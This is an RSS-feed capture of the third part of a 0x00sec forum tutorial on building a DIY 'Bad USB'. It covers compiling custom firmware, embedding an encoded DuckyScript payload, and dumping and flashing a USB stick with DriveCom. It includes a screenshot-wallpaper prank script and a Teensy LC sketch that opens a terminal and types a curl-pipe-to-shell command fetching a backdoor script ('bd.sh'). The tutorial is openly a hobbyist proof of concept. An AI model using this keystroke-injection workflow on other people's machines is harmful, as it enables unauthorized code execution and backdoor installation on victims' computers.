+<p>If you’ve followed my first part, you’ll already have one installed. If not, just get it <a href="https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/" rel="noopener nofollow ugc">here</a>.</p>
+<hr>
+<h2>How To Flash</h2>
+<p>Now, that we’re done with preparing our environment, we can start using the tools <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
+<h3>Warning</h3>
+<p><strong>I can not guarantee that everything will run fine. I’ve never encountered any problems, but I can’t promise it. Everything beyond this point is up to you!</strong></p>
+<h3>Custom Firmware</h3>
+<p>Go to <em>\Psyschson\firmware</em> and run the <code>build.bat</code>. If everything went right, you should see a new folder called <code>bin</code> with different files in it. We’ll need the <code>fw.bin</code> file.</p>
+<h3>Creating Your DuckyScript</h3>
+<p>We discussed that in the earlier parts. I recommend to use something easy, like a <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Wallpaper-prank" rel="noopener nofollow ugc">wallpaper prank</a>:</p>
+<pre><code class="lang-auto">GUI d
+DELAY 500
+PRINTSCREEN
+DELAY 100
+MENU
+DELAY 300
+STRING V
+DELAY 40
+STRING D
+DELAY 300
+GUI r
+DELAY 700
+STRING mspaint
+ENTER
+DELAY 1200
+CTRL v
+DELAY 500
+CTRL s
+DELAY 1000
+STRING %userprofile%\a.bmp
+ENTER
+DELAY 500
+ALT f
+DELAY 400
+STRING K
+DELAY 100
+STRING F
+DELAY 1000
+ALT F4
+DELAY 300
+GUI d
+</code></pre>
+<p>Now you have to encode it with the DuckEncoder as I told you in part 1. Here’s a little reminding:<br>
+<code>Duckencoder.jar -i &lt;input file&gt; -o &lt;output file&gt; -l &lt;language&gt;</code></p>
+<h3>Embedding The Payload</h3>
+<p>Just run our previously built EmbedPayload like this:</p>
+<p><code>EmbedPayload.exe &lt;Path to Payload&gt; &lt;Path to fw.bin&gt;</code></p>
+<p>Now <code>fw.bin</code> contains our payload. You can overwrite it by running <code>build.bat</code> again <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<h3>Dumping The Existing Firmware</h3>
+<p>I recommend you to dump your existing firmware. Else you couldn’t restore it, when you lost your fun at Bad USB <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">. Just use DriveCom like this:<br>
+<code>DriveCom.exe /drive=&lt;letter of your USB drive&gt; /action=DumpFirmware /burner=&lt;Path to our Burner Image&gt; /firmware=&lt;Path to the original fw.bin&gt;</code></p>
+<h3>Flashing Our Firmware</h3>
+<p>Now we can flash our Stick with the modified firmware. But hold in mind that it will be complicated to get the USB back into boot mode again! See the following section for more information.</p>
+<p>Again we’ll use DriveCom:<br>
+<code>DriveCom.exe /drive=&lt;USB drive letter&gt; /action=SendFirmware  /burner=&lt;Path to our Burner Image /firmware=&lt;Path to the modified fw.bin&gt;</code></p>
+<p>If some errors appear, try to use an older version of the Burner Image. In my case it fixed the issue <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<h3>Reflashing The Bad USB</h3>
+<p>If you want to install your original firmware or a new DuckyScript, you’ll have to set the USB back into boot mode again. This is not as complicated as it might look like <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">. Because the Bad USB is a fully functional keyboard, you can’t access it anymore from your computer. To bypass this, you’ll have to shorten the two pins at the bottom left:<br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/6/624c4d6814fa2ffb901e9386eff1b971993072d9.jpg" width="" height=""></p>
+<p>At this point props to <a class="mention" href="https://0x00sec.org/u/anon79434934">@anon79434934</a> for helping me out with the hardware part <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
+<hr>
+<h2>Teensy LC</h2>
+<p>After my first part, I’ve written with <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>, who already got a Bad USB working by programming a <a href="https://www.pjrc.com/teensy/teensyLC.html" rel="noopener nofollow ugc">Teensy LC</a>. He did some great work! The following is an equal program - like the one I discussed in my first part - for the Teensy by <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>:</p>
+<pre><code class="lang-auto">void release_keys (void)
+{
+ // Release all keys
+  Keyboard.set_modifier (0);  
+  Keyboard.send_now();
+  delay (100);
+}
+
+void setup() {
+  // put your setup code here, to run once:
+  delay (1000);
+  // Launch terminal (GNOME CTRL+ALT+t)
+  Keyboard.set_modifier (MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
+  Keyboard.send_now();
+  delay (100);
+  
+  Keyboard.press(KEY_T);
+  Keyboard.release(KEY_T);
+  delay (500); // Wait for the terminal to come up
+  
+  release_keys ();
+ 
+  // Send Command
+  Keyboard.println("curl -s http://127.0.0.1:8000/bd.sh | /bin/sh");
+
+  // Close terminal (CTRL+D)
+  Keyboard.set_modifier (MODIFIERKEY_CTRL);
+  Keyboard.send_now();
+  delay (100);
+  Keyboard.press(KEY_D);
+  Keyboard.release(KEY_D);
+  delay (100);
+  release_keys ();
+  
+}
+</code></pre>
+<p>Maybe he’s already working on a part about using a Teensy for installing ring0 malware? We’ll see… <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+<hr>
+<h2>Conclusion</h2>
+<p>This DIY Bad USB is more like a PoC, because you always have to shorten the two pins for flashing the firmware, which can be annoying <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. Anyway, I hope you enjoyed this short series and are as excited for <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>’s part as I am <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
+<p>|-TheDoctor-|</p>
+          <p><a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/1</link>
+        <pubDate>Mon, 03 Oct 2016 09:03:03 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1159-1</guid>
+        <source url="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159.rss">Plug In To Win - DIY Bad USB [Part 3/3]</source>
+      </item>
+  </channel>
+</rss>
